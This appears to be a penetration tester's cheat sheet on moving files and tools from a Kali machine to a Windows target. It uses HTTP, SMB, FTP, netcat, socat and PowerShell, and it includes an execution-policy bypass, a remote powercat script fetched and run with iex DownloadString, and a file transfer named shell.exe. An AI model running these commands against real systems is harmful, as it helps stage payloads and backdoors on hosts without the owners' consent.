# File Transfer
`477`
## HTTP Server

Server

``` bash
sudo python3 -m http.server 80
```

wget

``` bash
wget <uri> -O /path/to/file.ext

wget <uri> -P /path/to/
```

## SMB Protocol

Install

``` bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
sudo pip install -r requirements.txt
sudo python3 setup.py install
```

SMB Server

``` bash
$ locate whoami.exe
/usr/share/windows-resources/binaries/whoami.exe

$ smbserver.py a /usr/share/windows-binaries/
```

SMB Server

``` bash
$ \\<ip_server>\a\whoami.exe
```

## FTP Server

Install

``` bash
sudo apt-get install vsftpd
sudo service vsftpd start
```

Anonymous access

``` bash
sudo nano /etc/vsftpd.conf

=> anonymous_enable=YES
```

## Netcat

Kali machine

``` bash
nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
```

Windows machine

``` bash
nc -nv 192.168.11.130 4444 > wget.exe
```

## Socat

Kali machine

``` bash
sudo socat TCP4-LISTEN:443,fork file:shell.exe
```

Windows machine

``` bash
socat TCP4:192.168.11.130:443 file:shell.exe,create
```

## PowerShell

Kali machine

``` bash
sudo python3 -m http.server 80
```

Windows machine

``` bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.11.130/wget.exe','C:\Users\Public\Desktop\wget.exe')"
```

## Powercat

``` powershell
Set-ExecutionPolicy Unrestricted

iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

. .\powercat.ps1
```

Kali machine

``` bash
sudo nc -lnvp 443 > powercat.ps1
```

Windows machine

``` bash
powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
```